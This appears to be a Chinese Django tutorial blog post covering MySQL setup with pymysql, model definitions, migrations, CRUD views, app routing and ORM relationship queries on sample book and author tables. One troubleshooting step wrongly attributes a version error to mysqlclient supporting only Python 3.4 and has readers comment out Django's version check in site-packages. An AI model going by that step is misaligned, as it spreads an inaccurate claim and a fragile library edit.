<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// StudyDjango/StudyDjango/settings.py</span><br><span class="line"></span><br><span class="line">DATABASES = &#123;</span><br><span class="line">    # &#x27;default&#x27;: &#123;</span><br><span class="line">    #     &#x27;ENGINE&#x27;: &#x27;django.db.backends.sqlite3&#x27;,</span><br><span class="line">    #     &#x27;NAME&#x27;: BASE_DIR / &#x27;db.sqlite3&#x27;,</span><br><span class="line">    # &#125;</span><br><span class="line">    &#x27;default&#x27;:</span><br><span class="line">        &#123;</span><br><span class="line">            &#x27;ENGINE&#x27;: &#x27;django.db.backends.mysql&#x27;,  # 数据库引擎</span><br><span class="line">            &#x27;NAME&#x27;: &#x27;runoob&#x27;,  # 数据库名称</span><br><span class="line">            &#x27;HOST&#x27;: &#x27;127.0.0.1&#x27;,  # 数据库地址，本机 ip 地址 127.0.0.1 </span><br><span class="line">            &#x27;PORT&#x27;: 3306,  # 端口 </span><br><span class="line">            &#x27;USER&#x27;: &#x27;root&#x27;,  # 数据库用户名</span><br><span class="line">            &#x27;PASSWORD&#x27;: &#x27;123456&#x27;,  # 数据库密码</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>在与<code> settings.py</code> 同级目录下的 <code>__init__.py </code>中引入模块和进行配置</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// StudyDjango/StudyDjango/__init__.py</span><br><span class="line"></span><br><span class="line">import pymysql</span><br><span class="line">pymysql.install_as_MySQLdb()</span><br></pre></td></tr></table></figure>

<h3 id="定义模型"><a href="#定义模型" class="headerlink" title="定义模型"></a>定义模型</h3><h4 id="创建APP"><a href="#创建APP" class="headerlink" title="创建APP"></a>创建APP</h4><ul>
<li>Django 规定，如果要使用模型，必须要创建一个 app。我们使用以下命令创建一个 TestModel 的 app:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\proj\StudyDjango&gt;django-admin startapp TestModel</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/dbc9f282/image-20230801154926128.png" alt="image-20230801154926128"></p>
<ul>
<li>我们修改 <code>TestModel/models.py</code> 文件，代码如下：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.db import models</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Test(models.Model):</span><br><span class="line">    name = models.CharField(max_length=20)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>以上的类名代表了数据库表名(test)，且继承了models.Model，类里面的字段代表数据表中的字段(name)，数据类型则由CharField（相当于varchar）、DateField（相当于datetime）， max_length 参数限定长度。</p>
</blockquote>
<ul>
<li>接下来在 settings.py 中找到INSTALLED_APPS这一项，如下：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// StudyDjango\StudyDjango\settings.py</span><br><span class="line"></span><br><span class="line">INSTALLED_APPS = (</span><br><span class="line">    &#x27;django.contrib.admin&#x27;,</span><br><span class="line">    &#x27;django.contrib.auth&#x27;,</span><br><span class="line">    &#x27;django.contrib.contenttypes&#x27;,</span><br><span class="line">    &#x27;django.contrib.sessions&#x27;,</span><br><span class="line">    &#x27;django.contrib.messages&#x27;,</span><br><span class="line">    &#x27;django.contrib.staticfiles&#x27;,</span><br><span class="line">    &#x27;TestModel&#x27;,               # 添加此项</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<ul>
<li>在命令行中运行, 创建表结构,发现报错了</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\proj\StudyDjango&gt;python manage.py migrate</span><br><span class="line"></span><br><span class="line">  File &quot;D:\app\Python37\lib\site-packages\django\db\backends\mysql\base.py&quot;, line 36, in &lt;module&gt;</span><br><span class="line">    raise ImproperlyConfigured(&#x27;mysqlclient 1.4.0 or newer is required; you have %s.&#x27; % Database.__version__)</span><br><span class="line">django.core.exceptions.ImproperlyConfigured: mysqlclient 1.4.0 or newer is required; you have 0.10.1.</span><br></pre></td></tr></table></figure>

<ul>
<li><p>原因是 MySQLclient 目前只支持到 Python3.4，因此如果使用的更高版本的 python，把<code>D:\app\Python37\Lib\site-packages\django\db\backends\mysql\base.py</code> 对应报错代码注释</p>
</li>
<li><p>再次执行</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">E:\proj\StudyDjango&gt; python manage.py migrate   # 创建表结构</span><br><span class="line"></span><br><span class="line">E:\proj\StudyDjango&gt; python manage.py makemigrations TestModel  # 让 Django 知道我们在我们的模型有一些变更</span><br><span class="line">E:\proj\StudyDjango&gt; python manage.py migrate TestModel   # 创建表结构</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>查看表已经生成成功</li>
</ul>
<p><img src="/aposts/dbc9f282/image-20230801163314750.png" alt="image-20230801163314750"></p>
<h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><h3 id="操作模型"><a href="#操作模型" class="headerlink" title="操作模型"></a>操作模型</h3><h4 id="新增数据"><a href="#新增数据" class="headerlink" title="新增数据"></a>新增数据</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// StudyDjango/StudyDjango/testdb.py</span><br><span class="line">from django.http import HttpResponse</span><br><span class="line"></span><br><span class="line">from TestModel.models import Test</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 数据库操作</span><br><span class="line">def testdb(request):</span><br><span class="line">    test1 = Test(name=&#x27;runoob&#x27;)</span><br><span class="line">    test1.save()</span><br><span class="line">    return HttpResponse(&quot;&lt;p&gt;数据添加成功！&lt;/p&gt;&quot;)</span><br></pre></td></tr></table></figure>

<ul>
<li>下来我们在 StudyDjango目录中添加 testdb.py 文件到urls.py中</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.urls import path</span><br><span class="line"></span><br><span class="line">from . import views,testdb</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    # url(r&#x27;^$&#x27;, views.hello),</span><br><span class="line">    # path(&#x27;hello/&#x27;, views.hello),</span><br><span class="line">    path(&#x27;runoob/&#x27;, views.runoob),</span><br><span class="line">    path(&#x27;testdb/&#x27;, testdb.testdb),</span><br><span class="line"></span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<ul>
<li>访问 <code>http://127.0.0.1:8000/testdb</code> 就可以看到数据添加成功的提示。</li>
</ul>
<p><img src="/aposts/dbc9f282/image-20230801170113854.png" alt="image-20230801170113854"></p>
<h4 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.http import HttpResponse</span><br><span class="line"> </span><br><span class="line">from TestModel.models import Test</span><br><span class="line"> </span><br><span class="line"># 数据库操作</span><br><span class="line">def testdb(request):</span><br><span class="line">    # 初始化</span><br><span class="line">    response = &quot;&quot;</span><br><span class="line">    response1 = &quot;&quot;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    # 通过objects这个模型管理器的all()获得所有数据行，相当于SQL中的SELECT * FROM</span><br><span class="line">    list = Test.objects.all()</span><br><span class="line">        </span><br><span class="line">    # filter相当于SQL中的WHERE，可设置条件过滤结果</span><br><span class="line">    response2 = Test.objects.filter(id=1) </span><br><span class="line">    </span><br><span class="line">    # 获取单个对象</span><br><span class="line">    response3 = Test.objects.get(id=1) </span><br><span class="line">    </span><br><span class="line">    # 限制返回的数据 相当于 SQL 中的 OFFSET 0 LIMIT 2;</span><br><span class="line">    Test.objects.order_by(&#x27;name&#x27;)[0:2]</span><br><span class="line">    </span><br><span class="line">    #数据排序</span><br><span class="line">    Test.objects.order_by(&quot;id&quot;)</span><br><span class="line">    </span><br><span class="line">    # 上面的方法可以连锁使用</span><br><span class="line">    Test.objects.filter(name=&quot;runoob&quot;).order_by(&quot;id&quot;)</span><br><span class="line">    </span><br><span class="line">    # 输出所有数据</span><br><span class="line">    for var in list:</span><br><span class="line">        response1 += var.name + &quot; &quot;</span><br><span class="line">    response = response1</span><br><span class="line">    return HttpResponse(&quot;&lt;p&gt;&quot; + response + &quot;&lt;/p&gt;&quot;)</span><br></pre></td></tr></table></figure>

<h4 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.http import HttpResponse</span><br><span class="line"> </span><br><span class="line">from TestModel.models import Test</span><br><span class="line"> </span><br><span class="line"># 数据库操作</span><br><span class="line">def testdb(request):</span><br><span class="line">    # 修改其中一个id=1的name字段，再save，相当于SQL中的UPDATE</span><br><span class="line">    test1 = Test.objects.get(id=1)</span><br><span class="line">    test1.name = &#x27;Google&#x27;</span><br><span class="line">    test1.save()</span><br><span class="line">    </span><br><span class="line">    # 另外一种方式</span><br><span class="line">    #Test.objects.filter(id=1).update(name=&#x27;Google&#x27;)</span><br><span class="line">    </span><br><span class="line">    # 修改所有的列</span><br><span class="line">    # Test.objects.all().update(name=&#x27;Google&#x27;)</span><br><span class="line">    </span><br><span class="line">    return HttpResponse(&quot;&lt;p&gt;修改成功&lt;/p&gt;&quot;)</span><br></pre></td></tr></table></figure>

<h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.http import HttpResponse</span><br><span class="line"> </span><br><span class="line">from TestModel.models import Test</span><br><span class="line"> </span><br><span class="line"># 数据库操作</span><br><span class="line">def testdb(request):</span><br><span class="line">    # 删除id=1的数据</span><br><span class="line">    test1 = Test.objects.get(id=1)</span><br><span class="line">    test1.delete()</span><br><span class="line">    </span><br><span class="line">    # 另外一种方式</span><br><span class="line">    # Test.objects.filter(id=1).delete()</span><br><span class="line">    </span><br><span class="line">    # 删除所有数据</span><br><span class="line">    # Test.objects.all().delete()</span><br><span class="line">    </span><br><span class="line">    return HttpResponse(&quot;&lt;p&gt;删除成功&lt;/p&gt;&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><ul>
<li>Django 项目里多个app目录共用一个 urls 容易造成混淆，后期维护也不方便</li>
<li>在项目名（TestModel）中新增一个 <code>TestModel/urls.py</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.urls import path,re_path</span><br><span class="line">from django.conf.urls import url</span><br><span class="line"></span><br><span class="line">from TestModel import views # 从自己的 app 目录引入 views</span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(r&#x27;^userAdd/&#x27;, views.userAdd),</span><br><span class="line">    path(&#x27;userQuery/&#x27;, views.userQuery),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<ul>
<li>TestModel&#x2F;view.py 编写具体代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.http import HttpResponse</span><br><span class="line">from django.shortcuts import render</span><br><span class="line"></span><br><span class="line"># Create your views here.</span><br><span class="line">from TestModel.models import Test</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def userAdd(request):</span><br><span class="line">    test1 = Test(name=&#x27;runoob&#x27;)</span><br><span class="line">    test1.save()</span><br><span class="line">    return HttpResponse(&quot;&lt;p&gt;数据添加成功！&lt;/p&gt;&quot;)</span><br><span class="line"></span><br><span class="line">def userQuery(request):</span><br><span class="line">    # 初始化</span><br><span class="line">    response = &quot;&quot;</span><br><span class="line">    response1 = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    # 通过objects这个模型管理器的all()获得所有数据行，相当于SQL中的SELECT * FROM</span><br><span class="line">    list = Test.objects.all()</span><br><span class="line"></span><br><span class="line">    # filter相当于SQL中的WHERE，可设置条件过滤结果</span><br><span class="line">    response2 = Test.objects.filter(id=1)</span><br><span class="line"></span><br><span class="line">    # 获取单个对象</span><br><span class="line">    response3 = Test.objects.get(id=1)</span><br><span class="line"></span><br><span class="line">    # 限制返回的数据 相当于 SQL 中的 OFFSET 0 LIMIT 2;</span><br><span class="line">    Test.objects.order_by(&#x27;name&#x27;)[0:2]</span><br><span class="line"></span><br><span class="line">    # 数据排序</span><br><span class="line">    Test.objects.order_by(&quot;id&quot;)</span><br><span class="line"></span><br><span class="line">    # 上面的方法可以连锁使用</span><br><span class="line">    Test.objects.filter(name=&quot;runoob&quot;).order_by(&quot;id&quot;)</span><br><span class="line"></span><br><span class="line">    # 输出所有数据</span><br><span class="line">    for var in list:</span><br><span class="line">        response1 += var.name + &quot; &quot;</span><br><span class="line">    response = response1</span><br><span class="line">    return HttpResponse(&quot;&lt;p&gt;&quot; + response + &quot;&lt;/p&gt;&quot;)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>StudyDiango/StudyDiango/urls.py </code>中引用具体项目的url</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.conf.urls import url</span><br><span class="line">from django.urls import path, include</span><br><span class="line"></span><br><span class="line">from . import views,testdb</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    # url(r&#x27;^$&#x27;, views.hello),</span><br><span class="line">    # path(&#x27;hello/&#x27;, views.hello),</span><br><span class="line">    path(&#x27;runoob/&#x27;, views.runoob),</span><br><span class="line">    path(&#x27;testdb/&#x27;, testdb.testdb),</span><br><span class="line">    path(&#x27;testModel/&#x27;, include(&quot;TestModel.urls&quot;)),</span><br><span class="line"></span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<ul>
<li>浏览器打开<code>http://127.0.0.1:8000/testModel/userQuery/</code></li>
</ul>
<p><img src="/aposts/dbc9f282/image-20230802105812991.png" alt="image-20230802105812991"></p>
<h2 id="ORM多表实践"><a href="#ORM多表实践" class="headerlink" title="ORM多表实践"></a>ORM多表实践</h2><h3 id="表结构"><a href="#表结构" class="headerlink" title="表结构"></a>表结构</h3><p><strong>书籍表 Book</strong>：title 、 price 、 pub_date 、 publish（外键，多对一） 、 authors（多对多）</p>
<p><strong>出版社表 Publish</strong>：name 、 city 、 email</p>
<p><strong>作者表 Author</strong>：name 、 age 、 au_detail（一对一）</p>
<p><strong>作者详情表 AuthorDetail</strong>：gender 、 tel 、 addr 、 birthday</p>
<ul>
<li>关系图</li>
</ul>
<p><img src="/aposts/dbc9f282/image-20230802104212169.png" alt="image-20230802104212169"></p>
<h3 id="创建模型"><a href="#创建模型" class="headerlink" title="创建模型"></a>创建模型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Book(models.Model):</span><br><span class="line">    title = models.CharField(max_length=32)</span><br><span class="line">    price = models.DecimalField(max_digits=5, decimal_places=2)</span><br><span class="line">    pub_date = models.DateField()</span><br><span class="line">    # 关联出版社一对多，意思就是一个出版社可以有印刷多本书</span><br><span class="line">    publish = models.ForeignKey(&quot;Publish&quot;, on_delete=models.CASCADE)</span><br><span class="line">    # 多对多，意思就是多个作者可以编写多本书</span><br><span class="line">    authors = models.ManyToManyField(&quot;Author&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Publish(models.Model):</span><br><span class="line">    name = models.CharField(max_length=32)</span><br><span class="line">    city = models.CharField(max_length=64)</span><br><span class="line">    email = models.EmailField()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Author(models.Model):</span><br><span class="line">    name = models.CharField(max_length=32)</span><br><span class="line">    age = models.SmallIntegerField()</span><br><span class="line">    # 一对一，意思为一个作者对应一个作者详情</span><br><span class="line">    au_detail = models.OneToOneField(&quot;AuthorDetail&quot;, on_delete=models.CASCADE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AuthorDetail(models.Model):</span><br><span class="line">    gender_choices = (</span><br><span class="line">        (0, &quot;女&quot;),</span><br><span class="line">        (1, &quot;男&quot;),</span><br><span class="line">        (2, &quot;保密&quot;),</span><br><span class="line">    )</span><br><span class="line">    gender = models.SmallIntegerField(choices=gender_choices)</span><br><span class="line">    tel = models.CharField(max_length=32)</span><br><span class="line">    addr = models.CharField(max_length=64)</span><br><span class="line">    birthday = models.DateField()</span><br></pre></td></tr></table></figure>

<ul>
<li>生成表结构</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\proj\StudyDjango&gt; python manage.py makemigrations TestModel  # 让 Django 知道我们在我们的模型有一些变更</span><br><span class="line">E:\proj\StudyDjango&gt; python manage.py migrate TestModel   # 创建表</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/dbc9f282/image-20230802110229182.png" alt="image-20230802110229182"></p>
<blockquote>
<p> 注意testmode_book_authors 为book多对多authors的表</p>
</blockquote>
<h3 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 插入出版社</span><br><span class="line">insert into testmodel_publish(name,city,email) values (&quot;华山出版社&quot;, &quot;华山&quot;, &quot;hs@163.com&quot;), (&quot;明教出版社&quot;, &quot;黑木崖&quot;, &quot;mj@163.com&quot;)</span><br><span class="line"></span><br><span class="line"># 先插入 authordetail 表中多数据</span><br><span class="line">insert into testmodel_authordetail(gender,tel,addr,birthday) values (1,13432335433,&quot;华山&quot;,&quot;1994-5-23&quot;), (1,13943454554,&quot;黑木崖&quot;,&quot;1961-8-13&quot;), (0,13878934322,&quot;黑木崖&quot;,&quot;1996-5-20&quot;) </span><br><span class="line"></span><br><span class="line"># 再将数据插入 author，这样 author 才能找到 authordetail </span><br><span class="line">insert into testmodel_author(name,age,au_detail_id) values (&quot;令狐冲&quot;,25,1), (&quot;任我行&quot;,58,2), (&quot;任盈盈&quot;,23,3)</span><br></pre></td></tr></table></figure>

<h3 id="ORM添加数据"><a href="#ORM添加数据" class="headerlink" title="ORM添加数据"></a>ORM添加数据</h3><h4 id="一对多-外键-ForeignKey"><a href="#一对多-外键-ForeignKey" class="headerlink" title="一对多(外键 ForeignKey)"></a>一对多(外键 ForeignKey)</h4><p><strong>方式一:</strong> 传对象的形式，返回值的数据类型是对象，书籍对象。</p>
<p><strong>步骤：</strong></p>
<ul>
<li>a. 获取出版社对象</li>
<li>b. 给书籍的出版社属性 pulish 传出版社对象</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// testmode/views.py</span><br><span class="line"></span><br><span class="line">def add_book(request):</span><br><span class="line">    #  获取出版社对象</span><br><span class="line">    pub_obj = models.Publish.objects.filter(pk=1).first()</span><br><span class="line">    #  给书籍的出版社属性publish传出版社对象</span><br><span class="line">    book = models.Book.objects.create(title=&quot;菜鸟教程&quot;, price=200, pub_date=&quot;2010-10-10&quot;, publish=pub_obj)</span><br><span class="line">    print(book, type(book))</span><br><span class="line">    return HttpResponse(book)</span><br></pre></td></tr></table></figure>

<p><strong>方式二</strong>: 传对象 id 的形式(由于传过来的数据一般是 id,所以传对象 id 是常用的)。</p>
<p>一对多中，设置外键属性的类(多的表)中，MySQL 中显示的字段名是:<strong>外键属性名_id</strong>。</p>
<p>返回值的数据类型是对象，书籍对象。</p>
<p><strong>步骤：</strong></p>
<ul>
<li>a. 获取出版社对象的 id</li>
<li>b. 给书籍的关联出版社字段 pulish_id 传出版社对象的 id</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def add_book(request):</span><br><span class="line">    #  获取出版社对象</span><br><span class="line">    pub_obj = models.Publish.objects.filter(pk=1).first()</span><br><span class="line">    #  获取出版社对象的id</span><br><span class="line">    pk = pub_obj.pk</span><br><span class="line">    #  给书籍的关联出版社字段 publish_id 传出版社对象的id</span><br><span class="line">    book = models.Book.objects.create(title=&quot;冲灵剑法&quot;, price=100, pub_date=&quot;2004-04-04&quot;, publish_id=pk)</span><br><span class="line">    print(book, type(book))</span><br><span class="line">    return HttpResponse(book)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>testmodel/urls.py </code>引用<code>views.py</code>代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.urls import path,re_path</span><br><span class="line">from django.conf.urls import url</span><br><span class="line"></span><br><span class="line">from TestModel import views # 从自己的 app 目录引入 views</span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(r&#x27;^userAdd/&#x27;, views.userAdd),</span><br><span class="line">    path(&#x27;userQuery/&#x27;, views.userQuery),</span><br><span class="line">    path(&#x27;add_book/&#x27;, views.add_book),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h4 id="多对多-ManyToManyField-："><a href="#多对多-ManyToManyField-：" class="headerlink" title="多对多(ManyToManyField)："></a>多对多(ManyToManyField)：</h4><ul>
<li>在第三张关系表中新增数据</li>
</ul>
<p><strong>方式一:</strong> 传对象形式，无返回值。</p>
<p><strong>步骤：</strong></p>
<ul>
<li>a. 获取作者对象</li>
<li>b. 获取书籍对象</li>
<li>c. 给书籍对象的 authors 属性用 add 方法传作者对象</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def add_books(request):</span><br><span class="line">    #  获取作者对象</span><br><span class="line">    chong = models.Author.objects.filter(name=&quot;令狐冲&quot;).first()</span><br><span class="line">    ying = models.Author.objects.filter(name=&quot;任盈盈&quot;).first()</span><br><span class="line">    #  获取书籍对象</span><br><span class="line">    book = models.Book.objects.filter(title=&quot;菜鸟教程&quot;).first()</span><br><span class="line">    #  给书籍对象的 authors 属性用 add 方法传作者对象</span><br><span class="line">    # 菜鸟教程这本书有两个作者</span><br><span class="line">    book.authors.add(chong, ying)</span><br><span class="line">    return HttpResponse(book)</span><br></pre></td></tr></table></figure>

<p><strong>方式二:</strong> 传对象id形式，无返回值。</p>
<p><strong>步骤：</strong></p>
<ul>
<li>a. 获取作者对象的 id</li>
<li>b. 获取书籍对象</li>
<li>c. 给书籍对象的 authors 属性用 add 方法传作者对象的 id</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def add_books_1(request):</span><br><span class="line">    #  获取作者对象</span><br><span class="line">    chong = models.Author.objects.filter(name=&quot;令狐冲&quot;).first()</span><br><span class="line">    #  获取作者对象的id</span><br><span class="line">    pk = chong.pk</span><br><span class="line">    #  获取书籍对象</span><br><span class="line">    book = models.Book.objects.filter(title=&quot;冲灵剑法&quot;).first()</span><br><span class="line">    #  给书籍对象的 authors 属性用 add 方法传作者对象的id</span><br><span class="line">    book.authors.add(pk)</span><br></pre></td></tr></table></figure>

<h3 id="关联管理器-对象调用"><a href="#关联管理器-对象调用" class="headerlink" title="关联管理器(对象调用)"></a>关联管理器(对象调用)</h3><p><strong>前提：</strong></p>
<ul>
<li>多对多（双向均有关联管理器）</li>
<li>一对多（只有多的那个类的对象有关联管理器，即反向才有）</li>
</ul>
<p><strong>语法格式：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">正向：属性名,如add,create等</span><br><span class="line">反向：小写类名加 _set</span><br></pre></td></tr></table></figure>

<blockquote>
<p>一对多只能反向</p>
</blockquote>
<ul>
<li><strong>add</strong>。用于多对多，把指定的模型对象添加到关联对象集（关系表）中。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 方式一：传对象</span><br><span class="line">book_obj = models.Book.objects.get(id=10)</span><br><span class="line">author_list = models.Author.objects.filter(id__gt=2)</span><br><span class="line">book_obj.authors.add(*author_list)  # 将 id 大于2的作者对象添加到这本书的作者集合中</span><br><span class="line"># 方式二：传对象 id</span><br><span class="line">book_obj.authors.add(*[1,3]) # 将 id=1 和 id=3 的作者对象添加到这本书的作者集合中</span><br><span class="line">return HttpResponse(&quot;ok&quot;)</span><br></pre></td></tr></table></figure>

<ul>
<li>反向：<strong>小写表名_set</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ying = models.Author.objects.filter(name=&quot;任盈盈&quot;).first()</span><br><span class="line">book = models.Book.objects.filter(title=&quot;冲灵剑法&quot;).first()</span><br><span class="line">ying.book_set.add(book)</span><br><span class="line">return HttpResponse(&quot;ok&quot;)</span><br></pre></td></tr></table></figure>

<p><strong>create</strong>：创建一个新的对象，并同时将它添加到关联对象集之中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pub = models.Publish.objects.filter(name=&quot;明教出版社&quot;).first()</span><br><span class="line">wo = models.Author.objects.filter(name=&quot;任我行&quot;).first()</span><br><span class="line">book = wo.book_set.create(title=&quot;吸星大法&quot;, price=300, pub_date=&quot;1999-9-19&quot;, publish=pub)</span><br><span class="line">print(book, type(book))</span><br><span class="line">return HttpResponse(&quot;ok&quot;)</span><br></pre></td></tr></table></figure>

<p><strong>remove</strong>：从关联对象集中移除执行的模型对象。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">author_obj =models.Author.objects.get(id=1)</span><br><span class="line">book_obj = models.Book.objects.get(id=11)</span><br><span class="line">author_obj.book_set.remove(book_obj)</span><br><span class="line">return HttpResponse(&quot;ok&quot;)</span><br></pre></td></tr></table></figure>

<p><strong>clear</strong>：从关联对象集中移除一切对象，删除关联，不会删除对象。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#  清空独孤九剑关联的所有作者</span><br><span class="line">book = models.Book.objects.filter(title=&quot;菜鸟教程&quot;).first()</span><br><span class="line">book.authors.clear()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>对于 ForeignKey 对象，这个方法仅在 null&#x3D;True（可以为空）时存在。</p>
</blockquote>
<h3 id="ORM-查询"><a href="#ORM-查询" class="headerlink" title="ORM 查询"></a>ORM 查询</h3><h4 id="一对多"><a href="#一对多" class="headerlink" title="一对多"></a>一对多</h4><p>查询主键为 10 的书籍的出版社所在的城市（<strong>正向</strong>）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">book = models.Book.objects.filter(pk=10).first()</span><br><span class="line">res = book.publish.city</span><br><span class="line">print(res, type(res))</span><br><span class="line">return HttpResponse(&quot;ok&quot;)</span><br></pre></td></tr></table></figure>

<ul>
<li>查询明教出版社出版的书籍名（<strong>反向</strong>）。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pub = models.Publish.objects.filter(name=&quot;明教出版社&quot;).first()</span><br><span class="line"># pub.book_set.all()：取出书籍表的所有书籍对象，在一个 QuerySet 里，遍历取出一个个书籍对象。</span><br><span class="line">res = pub.book_set.all()</span><br><span class="line">for i in res:</span><br><span class="line">    print(i.title)</span><br><span class="line">return HttpResponse(&quot;ok&quot;)</span><br></pre></td></tr></table></figure>

<h4 id="一对一"><a href="#一对一" class="headerlink" title="一对一"></a>一对一</h4><p>查询令狐冲的电话（<strong>正向</strong>）</p>
<p>正向：对象.属性 (author.au_detail) 可以跳转到关联的表(作者详情表)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">author = models.Author.objects.filter(name=&quot;令狐冲&quot;).first()</span><br><span class="line">res = author.au_detail.tel</span><br><span class="line">print(res, type(res))</span><br><span class="line">return HttpResponse(&quot;ok&quot;)</span><br></pre></td></tr></table></figure>

<p>查询所有住址在黑木崖的作者的姓名（<strong>反向</strong>）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">addr = models.AuthorDetail.objects.filter(addr=&quot;黑木崖&quot;).first()</span><br><span class="line">res = addr.author.name</span><br><span class="line">print(res, type(res))</span><br><span class="line">return HttpResponse(&quot;ok&quot;)</span><br></pre></td></tr></table></figure>

<h4 id="多对多"><a href="#多对多" class="headerlink" title="多对多"></a>多对多</h4><ul>
<li><p>菜鸟教程所有作者的名字以及手机号（<strong>正向</strong>）。</p>
</li>
<li><p>正向：**对象.属性(book.authors)**可以跳转到关联的表(作者表)。</p>
</li>
<li><p>作者表里没有作者电话，因此再次通过**对象.属性(i.au_detail)**跳转到关联的表（作者详情表）</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">book = models.Book.objects.filter(title=&quot;菜鸟教程&quot;).first()</span><br><span class="line">res = book.authors.all()</span><br><span class="line">for i in res:</span><br><span class="line">    print(i.name, i.au_detail.tel)</span><br><span class="line">return HttpResponse(&quot;ok&quot;)</span><br></pre></td></tr></table></figure>

<ul>
<li>查询任我行出过的所有书籍的名字（<strong>反向</strong>）。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">author = models.Author.objects.filter(name=&quot;任我行&quot;).first()</span><br><span class="line">res = author.book_set.all()</span><br><span class="line">for i in res:</span><br><span class="line">    print(i.title)</span><br><span class="line">return HttpResponse(&quot;ok&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="基于双下划线的跨表查询"><a href="#基于双下划线的跨表查询" class="headerlink" title="基于双下划线的跨表查询"></a>基于双下划线的跨表查询</h3><p>正向：属性名称__跨表的属性名称</p>
<p>反向：小写类名__跨表的属性名称</p>
<h4 id="一对多-1"><a href="#一对多-1" class="headerlink" title="一对多"></a>一对多</h4><p>正向：查询菜鸟出版社出版过的所有书籍的名字与价格。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># publish__name 跨表中的name</span><br><span class="line">res = models.Book.objects.filter(publish__name=&quot;菜鸟出版社&quot;).values_list(&quot;title&quot;, &quot;price&quot;)</span><br></pre></td></tr></table></figure>

<p>反向：通过 小<strong>写类名__跨表的属性名称（book__title，book__price）</strong> 跨表获取数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">res = models.Publish.objects.filter(name=&quot;菜鸟出版社&quot;).values_list(&quot;book__title&quot;,&quot;book__price&quot;)</span><br><span class="line">return HttpResponse(&quot;ok&quot;)</span><br></pre></td></tr></table></figure>

